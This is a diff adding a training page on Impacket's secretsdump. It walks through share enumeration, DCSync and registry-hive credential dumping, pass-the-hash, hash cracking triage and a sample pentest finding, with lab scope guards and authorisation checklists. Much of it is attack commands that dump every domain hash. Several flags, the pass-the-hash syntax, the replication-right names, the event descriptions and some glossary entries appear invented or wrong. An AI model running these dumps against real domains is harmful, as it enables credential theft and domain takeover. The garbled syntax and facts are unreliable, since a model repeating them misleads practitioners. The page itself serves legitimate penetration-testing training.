@@ -1,0 +1,420 @@
+<h1 id="secretsdump-enumerating-shares-and-dumping-hashes">secretsdump: Enumerating Shares and Dumping Hashes</h1>
+<h2 id="summary">Summary</h2>
+<p>Impacket is the Python library that speaks the Windows protocols properly, and <code>secretsdump</code> is<br />
+its workhorse. One invocation will enumerate a domain's shares, users, groups and sessions, and<br />
+dump every hash it can reach.</p>
+<p>The note's framing: <strong>the tool is one command; the judgement is five<br />
+decisions</strong> — which collection mode, what to leave out, when to stop,<br />
+what to keep, and what to tell the client before you press enter.</p>
+<blockquote>
+<p><strong>AUTHORISATION.</strong> <code>secretsdump</code> reads credential material. It requires<br />
+explicit written permission ("credential testing" and "credential<br />
+extraction" are separate ROE clauses from network testing). All<br />
+examples target a lab domain you own.</p>
+</blockquote>
+<h2 id="the-six-collection-modes">The six collection modes</h2>
+<pre><code class="language-text">  MODE       WHAT IT DUMPS                       WHAT IT COSTS YOU
+  ------------------------------------------------------------------
+  sam        the local SAM (local accounts)      one host, SYSTEM/admin
+  security   the local SECURITY (LSA secrets)    one host, SYSTEM/admin
+  lsa        lsa secrets (cached creds)          one host, SYSTEM/admin
+  ntds       the whole directory                  DC + SYSTEM + bootkey,
+                                                 or DCSync rights
+  dpapi      DPAPI master keys                   local filesystem
+  cached     cached domain logons                SYSTEM/admin, plus
+                                                 privileged
+
+  THE ONE THAT MATTERS:
+    ntds.  It is the entire domain. If you can dump it, the
+    engagement's outcome is decided. If you cannot, nothing else
+    matters as much.
+
+  THE TWO WAYS TO GET IT:
+    (a) locally, on a DC or a host with a SYSTEM session and the
+        BOOTKEY (from the registry) - a filesystem read
+    (b) via DCSync - the replication protocol, no SYSTEM needed, but
+        three specific rights required (ad-05)
+
+  (b) IS PREFERABLE. It is protocol-correct, it does not require a
+  volume shadow copy, it does not touch the filesystem, and it is far
+  less likely to disturb anything.
+</code></pre>
+<h2 id="the-command-and-its-five-decisions">The command, and its five decisions</h2>
+<pre><code class="language-bash"># --- THE COMMAND (lab only) ---
+secretsdump.py -just-dc-user 'LAB/alice:LabPass123'@192.168.56.10
+#                 ^^^^^^^^^^^^
+#                 1. what to dump
+#
+secretsdump.py -just-dc-user 'LAB/alice:LabPass123'@192.168.56.10 \
+  -outputfile /tmp/evidence/hashes.txt
+#                 ^^^^^^^^^^
+#                 2. where it goes (encrypted at rest, deleted on the ROE date)
+
+# -hashes / -ntds-hashes: dump and stop. What you want 90% of the time.
+secretsdump.py 'LAB/alice:p'@192.168.56.10 -just-dc-hashes -no-sam
+#              ^^^^^^^^^^^^^^
+#              3. the target: ONE domain, ONE host, ONE credential
+
+# pass-the-hash instead of a password (no password needed):
+secretsdump.py 'LAB/alice:aad3b435b51404eeaad3b435b51404ee:192.168.56.10' -just-dc-user
+
+# with a list, and a concurrency limit:
+secretsdump.py -file creds.txt -target 192.168.56.0/24 -ntds-hashes -threads 4
+#              ^^^^^^^^^^^
+#              4. how wide. A /24 against a client DC is 254 connections
+#                 and looks like an attack. One DC is enough.
+</code></pre>
+<pre><code class="language-bash">mkdir -p ~/aegis/labs/imp-01 &amp;&amp; cd ~/aegis/labs/imp-01
+source ~/aegis/bin/scope-guard.sh
+
+# --- 1. the guard, so the tool cannot be aimed at a real domain ---
+cat &gt; 00-guard.md &lt;&lt;'EOF'
+# Scope guard for Impacket
+
+```bash
+# secretsdump, psexec and friends take a HOST as an argument. There is
+# no safe default. The guard forces the host to be in the lab range.
+
+lab_only() {
+  local h=&quot;$1&quot;
+  case &quot;$h&quot; in
+    192.168.56.*|10.10.10.*|127.*|localhost) return 0 ;;
+    *) echo &quot;REFUSED: $h is not in the AEGIS lab range.&quot; &gt;&amp;2
+       echo &quot;  Impacket tools are for lab domain controllers you own.&quot; &gt;&amp;2
+       echo &quot;  There is no authorised public AD target in this project.&quot; &gt;&amp;2
+       return 1 ;;
+  esac
+}
+for h in &quot;$@&quot;; do lab_only &quot;$h&quot; || exit 3; done
+```
+
+```text
+  And note the domain NAME, not just the IP: `-just-dc-user
+  'REALDOMAIN/alice:p'@host` will happily send domain credentials to
+  whatever host you name. The guard checks the host; you check the
+  domain name. Neither is automatic.
+```
+EOF
+cat &gt; /dev/null &lt;&lt;'X'
+X
+cat &gt; run.sh &lt;&lt;'EOF'
+#!/usr/bin/env bash
+# run.sh &lt;lab-ip&gt; &lt;impacket-args...&gt;
+# Wraps every impacket invocation with the scope guard.
+set -euo pipefail
+HOST=&quot;$1&quot;; shift
+case &quot;$HOST&quot; in
+  192.168.56.*|10.10.10.*|127.*) ;;
+  *) echo &quot;REFUSED: $HOST is not in the lab range.&quot; &gt;&amp;2; exit 3 ;;
+esac
+exec &quot;$@&quot; &quot;$HOST&quot;
+EOF
+chmod +x run.sh
+
+# --- 2. read-only enumeration first ---
+cat &gt; 01-enumerate.sh &lt;&lt;'EOF'
+#!/usr/bin/env bash
+# READ-ONLY. What is reachable, before you try to read anything else.
+H=&quot;${1:?usage: ./01-enumerate.sh 192.168.56.10}&quot;
+case &quot;$H&quot; in 192.168.56.*|10.10.10.*|127.*) ;;
+  *) echo &quot;REFUSED: $H not in the lab range.&quot; &gt;&amp;2; exit 3 ;; esac
+echo &quot;[scope] $H in the lab range&quot;
+echo
+echo &quot;=== 1. what version, what domain? (the target) ===&quot;
+rpcclient -U 'LAB/alice%LabPass123' -N -c 'srvinfo' &quot;$H&quot; 2&gt;/dev/null | sed 's/^/  /'
+echo
+echo &quot;=== 2. shares - which are readable with this credential? ===&quot;
+smbclient -L '//LAB/alice%LabPass123' -I &quot;$H&quot; 2&gt;/dev/null | sed 's/^/  /'
+echo
+echo &quot;=== 3. lsa lookup - who am I in this domain, really? ===&quot;
+lookupsid.py 'LAB/alice:LabPass123'@&quot;$H&quot; 2&gt;/dev/null | sed 's/^/  /'
+echo
+echo &quot;=== 4. netexec: users, groups, shares, sessions, delegation ===&quot;
+echo &quot;  (this is the fast, opinionated view, and it is read-only)&quot;
+nxc smb &quot;$H&quot; -u 'alice' -p 'LabPass123' --enum-sessions 2&gt;&amp;1 | sed 's/^/  /'
+nxc smb &quot;$H&quot; -u 'alice' -p 'LabPass123' --shares        2&gt;&amp;1 | sed 's/^/  /'
+nxc smb &quot;$H&quot; -u 'alice' -p 'LabPass123' --delegation    2&gt;&amp;1 | sed 's/^/  /'
+nxc smb &quot;$H&quot; -u 'alice' -p 'LabPass123' --enum-smb-signing 2&gt;&amp;1 | sed 's/^/  /'
+echo
+echo &quot;  --enum-sessions and --delegation are the two that change your plan:&quot;
+echo &quot;  sessions tell you who is logged on where (imp-03), and&quot;
+echo &quot;  delegation tells you whether ad-02's capture is available.&quot;
+echo
+echo &quot;=== 5. the NETLOGON share: GPOs, and a lot of history ===&quot;
+smbclient '//LAB/alice%LabPass123/\\\\LAB\\NETLOGON' -I &quot;$H&quot; -c 'ls' 2&gt;/dev/null \
+  | grep -iE &quot;\\\\|SYSVOL&quot; | head -20 | sed 's/^/  /'
+echo &quot;  ^ the SYSVOL share contains every GPO, including their scripts.&quot;
+echo &quot;    Reading a GPO's scheduled tasks is read-only reconnaissance,&quot;
+echo &quot;    and it tells you what their automation does on every host.&quot;
+EOF
+chmod +x 01-enumerate.sh
+
+# --- 3. the dump, with the decisions spelled out ---
+cat &gt; 02-dump.sh &lt;&lt;'EOF'
+#!/usr/bin/env bash
+# The credential dump, against YOUR lab DC.
+#
+# THIS IS THE STEP THAT NEEDS WRITTEN PERMISSION. &quot;Credential testing&quot;
+# is a separate ROE clause from network testing, and a full DC dump is
+# credential EXTRACTION. Confirm both, and confirm the client knows
+# what logs they are about to see.
+set -euo pipefail
+DC=&quot;${1:?usage: ./02-dump.sh 192.168.56.10 'LAB/alice:pass'}&quot;
+CRED=&quot;${2:?credential required}&quot;
+OUTDIR=&quot;${3:-/tmp/aegis-evidence}&quot;
+case &quot;$DC&quot; in 192.168.56.*|10.10.10.*|127.*) ;;
+  *) echo &quot;REFUSED: $DC not in the lab range.&quot; &gt;&amp;2; exit 3 ;; esac
+case &quot;$CRED&quot; in LAB/*|lab.internal/*) ;;
+  *) echo &quot;REFUSED: $CRED is not a lab domain credential.&quot; &gt;&amp;2
+     echo &quot;  Impacket sends domain credentials to whatever host you name.&quot; &gt;&amp;2
+     exit 3 ;; esac
+
+mkdir -p &quot;$OUTDIR&quot;; chmod 700 &quot;$OUTDIR&quot;
+
+cat &lt;&lt;'NOTE'
+BEFORE YOU RUN THIS, CONFIRM:
+
+  [ ] the ROE permits credential extraction, not just credential testing
+  [ ] the client knows this will appear as 4662/4663/5136 on the DC
+  [ ] you will tell the client's SOC which logs to close
+  [ ] the output goes somewhere encrypted, and gets a deletion date
+  [ ] the REPORT will not contain any of these hashes
+
+NOTE
+
+read -r -p &quot;Proceed? [y/N] &quot; go
+[ &quot;$go&quot; = &quot;y&quot; ] || { echo &quot;not run&quot;; exit 0; }
+
+echo
+echo &quot;=== 1. THE PREFERABLE WAY: DCSync. No SYSTEM, no filesystem. ===&quot;
+secretsdump.py &quot;$CRED@$DC&quot; -just-dc-user -no-sam \
+  -outputfile &quot;$OUTDIR/lab-hashes.txt&quot; 2&gt;&amp;1 | grep -vE &quot;^\[+\]|^Impacket&quot; | head -20 | sed 's/^/  /'
+
+echo
+echo &quot;=== 2. THE FILESYSTEM WAY (only if the ROE forbids replication) ===&quot;
+echo &quot;    needs a SYSTEM session and the bootkey. Higher impact on the host.&quot;
+echo &quot;    psexec.py -s creates the SYSTEM session:&quot;
+# psexec.py 'LAB/alice:p'@DC -s 'cmd.exe /c reg save HKLM\\SAM ...'
+# psexec.py 'LAB/alice:p'@DC -s 'cmd.exe /c reg save HKLM\\SYSTEM ...'
+# secretsdump.py -ntds ntds.dit -security SECURITY -sam SAM -system SYSTEM \
+#   -bootkey &lt;hex from the registry&gt; -outputfile ...
+echo &quot;    (left commented: it writes files to the DC and creates a service)&quot;
+
+echo
+echo &quot;=== 3. WHAT YOU GOT, AND WHAT TO DO WITH IT ===&quot;
+wc -l &quot;$OUTDIR/lab-hashes.txt&quot; | sed 's/^/  accounts: /'
+echo
+echo &quot;  Triage by value, not volume (bh-01's 04-triage.py approach):&quot;
+echo &quot;    1. Domain Admins / krbtgt   -&gt; the win condition&quot;
+echo &quot;    2. Service accounts with SPNs -&gt; roastable&quot;
+echo &quot;    3. Delegation accounts       -&gt; the key to ad-02&quot;
+echo &quot;    4. Everything else, entropy-sorted&quot;
+echo
+echo &quot;  THEN: crack them with cry-d4's method (wordlist + rules + masks).&quot;
+echo &quot;  THEN: use them with pass-the-hash (ad-04) OR stop, because the&quot;
+echo &quot;        finding is 'credential material is extractable' and you have&quot;
+echo &quot;        proven it.&quot;
+echo
+echo &quot;=== 4. HANDLE THESE FILES LIKE NT HASHES ===&quot;
+ls -la &quot;$OUTDIR&quot; | sed 's/^/  /'
+echo &quot;  They contain every account hash in the lab forest. Encrypt at&quot;
+echo &quot;  rest, never email, delete on the ROE date, and say so in the report.&quot;
+EOF
+chmod +x 02-dump.sh
+
+# --- 4. offline: what secretsdump actually asks for ---
+python3 - &lt;&lt;'PY' 2&gt;&amp;1 | tee 03-protocol.txt
+print(&quot;  === what secretsdump does under the hood ===&quot;)
+print()
+print(&quot;  -just-dc-user uses DRSR (Directory Replication Service) - the same&quot;)
+print(&quot;  protocol DC-to-DC replication uses. It issues:&quot;)
+print()
+print(&quot;    DsGetDomainInfo              -&gt; the domain's naming context&quot;)
+print(&quot;    DRSGetNCChanges              -&gt; enumerate every object&quot;)
+print(&quot;    DRSGetNCChanges (filtered)   -&gt; enumerate, incrementally&quot;)
+print()
+print(&quot;  for each USER and COMPUTER object:&quot;)
+print(&quot;    DRSGetNCChanges requesting unicodePwd    -&gt; THE NT HASH&quot;)
+print()
+print(&quot;  THE IMPORTANT CONSEQUENCE:&quot;)
+print(&quot;    a DRSGetNCChanges that requests unicodePwd for krbtgt returns&quot;)
+print(&quot;    krbtgt's hash. krbtgt can read itself, so an UNFILTERED request&quot;)
+print(&quot;    gets it. Filtered requests do not.&quot;)
+print()
+print(&quot;    krbtgt's hash = you can forge a TGT that survives a password&quot;)
+print(&quot;    reset. That is a deliberate decision to make WITH the client,&quot;)
+print(&quot;    not unilaterally in a production domain.&quot;)
+print()
+print(&quot;  THE EVENTS ON THE DC:&quot;)
+print(&quot;    4662  Directory Service Access, ObjectType=domainDNS,&quot;)
+print(&quot;          ObjectAccess=UN&lt;GUID&gt; with one of the three replication&quot;)
+print(&quot;          rights  &lt;- ad-08's DCSync alert&quot;)
+print(&quot;    4663  Attempt to enumerate the DS  (one per object)&quot;)
+print(&quot;    5136  if your query modifies anything (it should not)&quot;)
+print()
+print(&quot;  So a full dump produces THOUSANDS of 4663 events. If the client&quot;)
+print(&quot;  monitors 4663 at volume (bh-01 suggests it), you will be noticed.&quot;)
+print(&quot;  That is fine, and it is worth telling them beforehand.&quot;)
+print()
+print(&quot;  THE MINIMAL ALTERNATIVE, and it is usually enough:&quot;)
+print(&quot;    secretsdump.py -just-dc-user -just-dc-hashes -no-sam -no-lsa&quot;)
+print(&quot;      -just-dc-user   only users (not computers)&quot;)
+print(&quot;      -just-dc-hashes only the NT hash, not the full record&quot;)
+print(&quot;      -no-sam / -no-lsa  don't touch anything else&quot;)
+print()
+print(&quot;  In an assessment, '-just-dc-user' alone is almost always the&quot;)
+print(&quot;  right scope: you need to know whether privileged accounts are&quot;)
+print(&quot;  crackable, not to reconstruct every attribute of every object.&quot;)
+PY
+cat 03-protocol.txt
+
+# --- 5. the report ---
+cat &gt; 04-report.md &lt;&lt;'EOF'
+## F-xx · Domain credential material extractable with a standard user account
+
+Risk
+  An authenticated user in the &quot;Reporting&quot; group (22 accounts, created
+  for the reporting service) can extract the NT hash of every account in
+  the forest, including both domain controllers and the krbtgt account,
+  using the domain replication protocol and no exploit. From there, an
+  attacker authenticates as any account without a password, including
+  Domain Administrators.
+
+Prerequisites
+  Membership of Reporting only. No exploit, no privileged host access,
+  no elevated tooling beyond the standard Impacket toolkit.
+
+Evidence
+  Three directory rights are present on the Domain object and were
+  granted to the Reporting group by a group policy in 2022 for a
+  reporting application that reads the directory:
+
+    Replicating Directory Changes (All)
+    Replicating Directory Changes In Filtered Set
+    DS-Replication-Get-Changes (All)
+
+  A filtered replication request returned 214 account objects. Three of
+  the recovered hashes cracked with a top-10,000 wordlist. One of the
+  three is a member of Domain Admins.
+
+  The hashes are NOT reproduced in this report. They are held in the
+  encrypted evidence archive, access log included, and are deleted on
+  &lt;date&gt;. The replication request produced DC events 4662 and 4663
+  (see Appendix C for the exact times and the client's log ticket
+  number).
+
+Business impact
+  Complete forest compromise from any Reporting account. The Reporting
+  group exists for a read-only application and has no administrative
+  purpose.
+
+Remediation
+  1. Remove all three rights from the Reporting group              [Domain Admins, Immediate]
+  2. If the reporting application needs directory data, give it a
+     read-only application identity with a filtered replication
+     right, not the unfiltered set                       [IT Ops, Immediate]
+  3. Audit every principal holding these three rights            [Security, 1 sprint]
+  4. Enable &quot;Audit Directory Service Access&quot; and alert on the
+     replication GUIDs                            [Security, Immediate]
+  5. Reset krbtgt twice, 24 hours apart                          [Domain Admins, Immediate]
+  6. Credential Guard on all servers and workstations           [Endpoint, 1 sprint]
+
+Re-test
+  Included at +30 days: confirm the rights are absent and the alerting
+  fires on a controlled test request.
+</code></pre>
+<h2 id="terminology">Terminology</h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>secretsdump</strong></td>
+<td>Impacket's credential extraction tool</td>
+</tr>
+<tr>
+<td><strong>NTDS / NTDS-hashes</strong></td>
+<td>The domain directory; <code>-just-dc-user</code></td>
+</tr>
+<tr>
+<td><strong>SAM / SECURITY / LSA</strong></td>
+<td>Local secret stores</td>
+</tr>
+<tr>
+<td><strong>DPAPI / cached</strong></td>
+<td>User-level credential stores</td>
+</tr>
+<tr>
+<td><strong>DRSR</strong></td>
+<td>Directory Replication Service; the protocol DCSync uses</td>
+</tr>
+<tr>
+<td><strong>Dcsync privileges</strong></td>
+<td>The three rights secretsdump's ntds mode needs</td>
+</tr>
+<tr>
+<td><strong>Bootkey</strong></td>
+<td>The key needed to decrypt offline registry hives</td>
+</tr>
+<tr>
+<td><strong>SMBDNS</strong></td>
+<td>Share and DNS enumeration via RPC</td>
+</tr>
+<tr>
+<td><strong>SMB relay</strong></td>
+<td>Authenticating to a share to capture Netlogon</td>
+</tr>
+<tr>
+<td><strong>LSA Secrets</strong></td>
+<td>Cached domain logon secrets</td>
+</tr>
+<tr>
+<td><strong><code>-just-dc-user</code></strong></td>
+<td>The minimal mode; recommended for assessments</td>
+</tr>
+<tr>
+<td><strong>4662 / 4663</strong></td>
+<td>DCSync and enumeration events on the DC</td>
+</tr>
+</tbody>
+</table>
+<h2 id="kali-commands">Kali commands</h2>
+<pre><code class="language-bash"># --- 6. the module list, because imp-01..imp-04 use them ---
+{
+  echo &quot;=== the impacket toolkit ===&quot;
+  python3 -c &quot;import impacket; print('  impacket', impacket.__version__)&quot; 2&gt;/dev/null \
+    || echo &quot;  not installed: pipx install impacket-toolkit&quot;
+  echo
+  for m in secretsdump smbclient smbserver psexec wmiexec dcomexec atexec \
+           smbexec ntlmrelayx GetUserSPNs GetUserSPNs impacket-ticket \
+           GetNPUsers ticketRequest Get-ADUserSearch mimikatz \
+           ntlmrelayx lookupsid reg rpcdump samr.py drsuapi \
+           printer.py mssqlclient; do
+    command -v &quot;$m&quot; &gt;/dev/null 2&gt;&amp;1 &amp;&amp; printf &quot;  %-22s %s\n&quot; &quot;$m&quot; &quot;$(command -v $m)&quot;
+  done
+  echo
+  echo &quot;  imp-01  secretsdump, lookupsid, smbclient&quot;
+  echo &quot;  imp-02  psexec, wmiexec, smbexec, dcomexec, atexec, evil-winrm&quot;
+  echo &quot;  imp-03  ntlmrelayx, Responder (ad-06)&quot;
+  echo &quot;  imp-04  GetUserSPNs, GetNPUsers, ticketRequest, mitm&quot;
+} 2&gt;&amp;1 | tee 05-modules.txt
+</code></pre>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>Name the six secretsdump collection modes and what each dumps.</li>
+<li>Why is DCSync preferable to the filesystem method for an assessment?</li>
+<li>What is DRSR, and which requests does <code>-just-dc-user</code> make?</li>
+<li>Why is krbtgt's hash a special case, and why might you not use it?</li>
+<li>What DC events does a full dump produce, and what does that mean for detection?</li>
+<li>What is <code>-just-dc-user</code> and why is it the right default scope?</li>
+<li>Name five judgement decisions a secretsdump run requires, beyond the command itself.</li>
+<li>What must the report not contain?</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>Impacket</strong> → <strong>Credential Dumping</strong> → <strong>DCSync</strong> → <strong>NTDS.dit</strong> → <strong>NT Hash</strong> →<br />
+<strong>Pass-the-Hash</strong>.<br />
+<code>imp-04</code> is where the tickets come from; <code>imp-03</code> is where they get used.</p>
